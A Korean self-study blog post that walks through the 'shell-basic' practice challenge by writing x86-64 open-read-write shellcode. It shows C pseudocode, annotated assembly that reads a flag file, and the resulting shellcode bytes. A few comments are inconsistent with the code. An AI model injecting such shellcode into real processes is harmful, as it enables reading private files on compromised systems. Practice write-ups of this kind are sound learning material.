---
layout: post
title: "shell-basic"
categories: [Self-study]
tags: [shellcode, assembly, syscall]
last_modified_at: 2024-01-22
---

execve 사용이 안되니까 orw 사용해야될듯  
파일 위치 이 `/home/shell_basic/flag_name_is_loooooong`

```c
fd = open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY, 0)
read_data = read(fd, buffer, 128)
print_data = write(1, buffer, len(read_data))
```

를 어셈블러로 변환  
shellcode 강의 참고해서 작성  

리틀 엔디안 적용해서 8바이트씩 끊어서 반대로 입력해줘야 함  

```assembly
xor rax, rax    ; rax = 0
push rax        ; 스택에 rax의 값 저장('\0')
mov rax, 0x676E6F6F6F6F6F6F    ; rax = "gnoooooo"
push rax                       ; 스택에 rax의 값 저장
mov rax, 0x6C5F73695F656D61    ; rax = "l_si_ema"
push rax                       ; 스택에 rax의 값 저장
mov rax, 0x6E5F67616C662F63    ; rax = "n_galf/c"
push rax                       ; 스택에 rax의 값 저장
mov rax, 0x697361625F6C6C65    ; rax = "isab_lle"
push rax                       ; 스택에 rax의 값 저장
mov rax, 0x68732F656D6F682F    ; rax = "hs/emoh/"
push rax                       ; 스택에 rax의 값 저장
mov rdi, rsp    ; rdi = "/tmp/flag" ;rdi 설정
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open 
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp  
mov rdx, 4096    
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x128)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rdx, rax
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x128
```

오류 떠서 라업 참고했더니 elf64로 설정함  

.text만 뜨기  

16진수 값 출력  
```
\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x00\x10\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xc2\xb8\x01\x00\x00\x00\x0f\x05
```